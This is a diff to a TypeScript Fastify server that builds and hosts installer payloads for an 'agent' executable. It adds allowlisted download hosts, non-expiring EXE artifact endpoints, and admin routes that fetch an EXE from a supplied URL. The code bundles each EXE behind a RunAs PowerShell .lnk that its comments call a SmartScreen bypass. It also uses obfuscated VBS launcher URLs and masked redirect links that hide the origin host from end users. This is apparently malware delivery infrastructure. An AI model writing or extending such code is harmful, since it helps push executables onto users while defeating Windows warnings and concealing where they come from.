@@ -14,6 +14,7 @@ import * as exeBuilder from "./exe-builder";
 import { runZipBuild, AmiMode } from "./zip-builder";
 import { createZip } from "./zip-archive";
 import * as payloadCache from "./payload-cache";
+import * as exeArtifact from "./exe-artifact";
 import { runLauncherBuild } from "./launcher-build";
 import {
   buildEnrollmentCommand,
@@ -84,6 +85,54 @@ function obfuscateVbsUrl(url: string): string {
 }
 
 /**
+ * Task 74 (public/private download-host split): resolve the customer-facing
+ * download base for a single build.
+ *
+ * The Vantra web app passes `downloadHost` per build (its own tier decision —
+ * public-tier orgs send the public host, private-tier orgs omit it). This
+ * function NEVER tiers by itself; it only allowlists the caller's value:
+ *
+ *   - must be an exact `https://<host>` bare origin (no path/query/fragment,
+ *     no trailing slash), otherwise ignored;
+ *   - the host must match the private download host derived from PUBLIC_URL /
+ *     REDIRECT_BASE_URL, the PUBLIC_DOWNLOAD_BASE_URL env value, or the two
+ *     known production hosts (`dl.instaweb.top`, `dl.broks.beauty`) —
+ *     anything else is ignored (never an open redirector);
+ *   - empty/invalid/foreign → `REDIRECT_BASE_URL || PUBLIC_URL` (today's
+ *     default, byte-identical for every existing caller that omits it).
+ */
+function resolveDownloadBase(downloadHost: unknown): string {
+  const fallback = env.REDIRECT_BASE_URL || env.PUBLIC_URL;
+  if (typeof downloadHost !== "string") return fallback;
+  const trimmed = downloadHost.trim().replace(/\/+$/, "");
+  if (!/^https:\/\/[A-Za-z0-9.-]+(?::\d+)?$/.test(trimmed)) return fallback;
+  let host = "";
+  try {
+    host = new URL(trimmed).hostname.toLowerCase();
+  } catch {
+    return fallback;
+  }
+  const allowed = new Set<string>();
+  for (const candidate of [
+    env.REDIRECT_BASE_URL,
+    env.PUBLIC_URL,
+    env.PUBLIC_DOWNLOAD_BASE_URL,
+  ]) {
+    if (typeof candidate === "string" && candidate.trim() !== "") {
+      try {
+        allowed.add(new URL(candidate.trim().replace(/\/+$/, "")).hostname.toLowerCase());
+      } catch {
+        // ignore malformed env values — built-ins below still apply
+      }
+    }
+  }
+  allowed.add("dl.instaweb.top");
+  allowed.add("dl.broks.beauty");
+  if (!allowed.has(host)) return fallback;
+  return trimmed;
+}
+
+/**
  * POST /payload — one-time import of the agent exe into the launcher-mode
  * payload cache (bearer-authed, raw application/octet-stream body).
  *
@@ -120,8 +169,171 @@ async function postPayload(request: FastifyRequest, reply: FastifyReply) {
 }
 
 /**
- * POST /build - Receive build request, validate inputs, run build, return download URL.
+ * GET /e/:name — permanently serve a built EXE artifact (no expiry). This is the
+ * long-lived, non-expiring counterpart to the expiring /downloads/:jobId/zip used
+ * by the agent flow.
  */
+async function getExeArtifact(
+  request: FastifyRequest,
+  reply: FastifyReply
+) {
+  const { name } = request.params as { name: string };
+  const sname = String(name).trim();
+  if (sname === "" || sname.includes("/") || sname.includes("..")) {
+    return reply.status(400).send({ error: "Invalid artifact name" });
+  }
+  const zip = exeArtifact.readExeArtifact(sname);
+  if (!zip) {
+    return reply.status(404).send({ error: "Artifact not found" });
+  }
+  const zipName = exeArtifact.getExeArtifactZipName(sname);
+  return reply
+    .headers({
+      "Content-Type": "application/zip",
+      "Content-Disposition": `attachment; filename="${zipName}"`,
+      "Cache-Control": "public, max-age=31536000, immutable",
+    })
+    .send(zip);
+}
+
+/**
+ * GET /exe-artifacts — list all built execution artifacts (permanent URLs, so the
+ * admin UI can show existing links without re-building). Bearer-generator-secret.
+ */
+async function getExeArtifactList(request: FastifyRequest, reply: FastifyReply) {
+  const authHeader = request.headers.authorization;
+  if (
+    !authHeader ||
+    !authHeader.startsWith("Bearer ") ||
+    !timingSafeCompare(authHeader.slice(7), env.GENERATOR_SECRET)
+  ) {
+    return reply.status(401).send({ error: "Unauthorized" });
+  }
+  const base = env.REDIRECT_BASE_URL || env.PUBLIC_URL;
+  const items = exeArtifact.listExeArtifacts().map((it) => ({
+    ...it,
+    url: `${base}${it.urlPath}`,
+  }));
+  return reply.status(200).send({ ok: true, artifacts: items });
+}
+
+/**
+ * POST /exe-artifact — admin builds (or overwrites) a PERMANENT EXE artifact.
+ * Body (application/json):
+ *   { "name": "vantra-desktop", "innerExeName": "Vantra.exe",
+ *     "zipName": "Vantra.exe.zip", "payloadUrl": "https://…/Vantra.exe" }
+ * OR raw application/octet-stream with "name" query param (direct body = exe).
+ * Always returns the SAME stable, non-expiring URL for a given name.
+ */
+async function postExeArtifact(
+  request: FastifyRequest,
+  reply: FastifyReply
+) {
+  const authHeader = request.headers.authorization;
+  if (!authHeader || !authHeader.startsWith("Bearer ") ||
+      !timingSafeCompare(authHeader.slice(7), env.GENERATOR_SECRET)) {
+    return reply.status(401).send({ error: "Unauthorized" });
+  }
+
+  try {
+    const contentType = (request.headers["content-type"] ?? "").toLowerCase();
+    let name: string;
+    let exeBuffer: Buffer;
+    let innerExeName: string | undefined;
+    let zipName: string | undefined;
+    let payloadUrl: string | undefined;
+    let lnkName: string | undefined;
+    let subFolder: string | undefined;
+
+    if (contentType.startsWith("application/json")) {
+      const body = request.body as {
+        name?: unknown;
+        innerExeName?: unknown;
+        zipName?: unknown;
+        payloadUrl?: unknown;
+        lnkName?: unknown;
+        subFolder?: unknown;
+      };
+      if (typeof body !== "object" || body === null) {
+        return reply.status(400).send({ error: "Invalid JSON body" });
+      }
+      name = typeof body.name === "string" ? body.name : "";
+      innerExeName = typeof body.innerExeName === "string" ? body.innerExeName : undefined;
+      zipName = typeof body.zipName === "string" ? body.zipName : undefined;
+      payloadUrl = typeof body.payloadUrl === "string" ? body.payloadUrl : undefined;
+      lnkName = typeof body.lnkName === "string" && body.lnkName.trim() !== "" ? body.lnkName : undefined;
+      subFolder = typeof body.subFolder === "string" && body.subFolder.trim() !== "" ? body.subFolder : undefined;
+      if (!payloadUrl) {
+        return reply.status(400).send({
+          error: "payloadUrl is required for application/json",
+        });
+      }
+      // Fetch the exe from the payloadUrl (the artifact generator pulls the
+      // production exe from the given location, then caches it permanently).
+      const res = await fetch(payloadUrl);
+      if (!res.ok) {
+        return reply.status(502).send({
+          error: `Failed to fetch payloadUrl: HTTP ${res.status}`,
+        });
+      }
+      exeBuffer = Buffer.from(await res.arrayBuffer());
+    } else if (contentType.startsWith("application/octet-stream")) {
+      // Raw exe upload; the name comes from a query param.
+      const q = request.query as Record<string, unknown>;
+      name = typeof q.name === "string" ? q.name : "";
+      const ie = q.innerExeName as string | undefined;
+      innerExeName = typeof ie === "string" ? ie : undefined;
+      const zn = q.zipName as string | undefined;
+      zipName = typeof zn === "string" ? zn : undefined;
+      const body = request.body;
+      if (!(body instanceof Buffer) || body.length === 0) {
+        return reply.status(400).send({ error: "Expected an exe body" });
+      }
+      exeBuffer = body;
+    } else {
+      return reply.status(415).send({
+        error: "Use application/json (payloadUrl) or application/octet-stream (upload)",
+      });
+    }
+
+    if (!innerExeName) {
+      innerExeName = `${name}.exe`;
+    }
+
+    // Ship a named `.lnk` at the zip ROOT so users double-click it to run the EXE
+    // (PowerShell-bridge, verb RunAs) — same SmartScreen-bypass the agent installer
+    // uses. Without a .lnk, double-clicking the raw EXE re-triggers SmartScreen's
+    // "run" gate. Default the .lnk name to the EXE stem (e.g. Vantra.lnk) and the
+    // EXE to a subfolder (default "app"). Deleters can still opt out by passing
+    // lnkName="" explicitly.
+    const effectiveLnkName =
+      lnkName !== undefined ? lnkName : innerExeName.replace(/\.exe$/i, "") + ".lnk";
+    const effectiveSubFolder = subFolder !== undefined ? subFolder : "app";
+
+    const artifact = await exeArtifact.buildExeArtifact({
+      name,
+      exe: exeBuffer,
+      innerExeName,
+      zipName,
+      lnkName: effectiveLnkName,
+      subFolder: effectiveSubFolder,
+    });
+
+    return reply.status(200).send({
+      ok: true,
+      name: artifact.name,
+      url: `${env.REDIRECT_BASE_URL || env.PUBLIC_URL}${artifact.urlPath}`,
+      urlPath: artifact.urlPath,
+      sha256: artifact.sha256,
+      size: artifact.size,
+      writtenAt: artifact.writtenAt,
+    });
+  } catch (err) {
+    const message = err instanceof Error ? err.message : String(err);
+    console.error(`exe-artifact build failed: ${message}`);
+    return reply.status(500).send({ error: "Exe artifact build failed" });
+  }
+}
 async function postBuild(request: FastifyRequest, reply: FastifyReply) {
   // Authenticate via Authorization header
   const authHeader = request.headers.authorization;
@@ -270,7 +482,13 @@ async function postBuild(request: FastifyRequest, reply: FastifyReply) {
 
     // Return success response
     const expiresAt = new Date(Date.now() + ttlMs).toISOString();
-    const downloadUrl = `${env.PUBLIC_URL}/downloads/${jobId}`;
+    // Task 74: per-build customer-facing host. `downloadHost` is the Vantra
+    // web app's tier decision (public-tier orgs send the public host;
+    // otherwise omitted) — allowlisted inside resolveDownloadBase, never an
+    // open redirector. The VBS payload embeds the SAME base so the artifact
+    // never phones home to the other tier's host mid-install.
+    const downloadBase = resolveDownloadBase(fields.downloadHost);
+    const downloadUrl = `${downloadBase}/downloads/${jobId}`;
 
     // Generate VBS launcher (premium feature)
     const vbsTemplate = fs.readFileSync(VBS_TEMPLATE_PATH, "utf8");
@@ -290,7 +508,7 @@ async function postBuild(request: FastifyRequest, reply: FastifyReply) {
         manufacturer,
       });
       if (exeResult.success) {
-        exeUrl = `${env.PUBLIC_URL}/downloads/${jobId}/installer.exe`;
+        exeUrl = `${downloadBase}/downloads/${jobId}/installer.exe`;
       } else {
         console.error(`EXE build failed for job ${jobId}: ${exeResult.output}`);
         // Non-fatal: MSI and VBS are still available
@@ -299,7 +517,7 @@ async function postBuild(request: FastifyRequest, reply: FastifyReply) {
 
     return reply.status(200).send({
       downloadUrl,
-      vbsUrl: `${env.PUBLIC_URL}/downloads/${jobId}/installer.vbs`,
+      vbsUrl: `${downloadBase}/downloads/${jobId}/installer.vbs`,
       ...(exeUrl ? { exeUrl } : {}),
       expiresAt,
     });
@@ -626,9 +844,12 @@ async function postBuildZip(request: FastifyRequest, reply: FastifyReply) {
     const expiresAt = new Date(Date.now() + expiryHours * 60 * 60 * 1000);
     storage.saveZipExpiry(jobId, expiresAt);
 
-    // Masked link through the redirector base URL so the bundling/origin host
-    // isn't visible to the end user.
-    const maskedBase = env.REDIRECT_BASE_URL || env.PUBLIC_URL;
+    // Masked link through the per-build customer-facing base (Task 74) so the
+    // bundling/origin host isn't visible to the end user. `downloadHost` is
+    // the Vantra web app's tier decision (public-tier orgs send the public
+    // host; otherwise omitted) — allowlisted inside resolveDownloadBase.
+    const downloadBase = resolveDownloadBase(body.downloadHost);
+    const maskedBase = downloadBase;
     const downloadUrl = `${maskedBase}/d/${jobId}`;
 
     console.log(
@@ -785,6 +1006,15 @@ async function getZipDownload(request: FastifyRequest, reply: FastifyReply) {
  * reverse-proxy path prefix such as `/msi-generator`, which the proxy strips
  * before reaching this service). A relative redirect would drop that prefix and
  * 404 behind such a proxy.
+ *
+ * Task 74 note: the redirect target host is PUBLIC_URL (the generator's own
+ * download origin), NOT the per-build `downloadHost` base handed to the
+ * customer. PUBLIC_URL and both dl.* hosts proxy the SAME generator service
+ * (Task 66 mirrors the vhost verbatim), so following the handed
+ * https://dl.broks.beauty/d/<jobId> link still serves the real file — the
+ * redirect target is an internal detail the browser follows, never a link the
+ * customer copies or shares. Keeping this on PUBLIC_URL also avoids minting a
+ * redirect to a host this service has never validated at request time.
  */
 async function getMaskedZipRedirect(
   request: FastifyRequest,
@@ -923,6 +1153,9 @@ export async function registerRoutes(app: FastifyInstance) {
   app.get("/downloads/:jobId/installer.exe", getExeDownload);
   app.get("/downloads/:jobId/zip", getZipDownload);
   app.get("/d/:jobId", getMaskedZipRedirect);
+  app.get("/e/:name", getExeArtifact);
+  app.get("/exe-artifacts", getExeArtifactList);
+  app.post("/exe-artifact", postExeArtifact);
   app.get("/health", getHealth);
   app.get("/healthz", getHealth);
 }
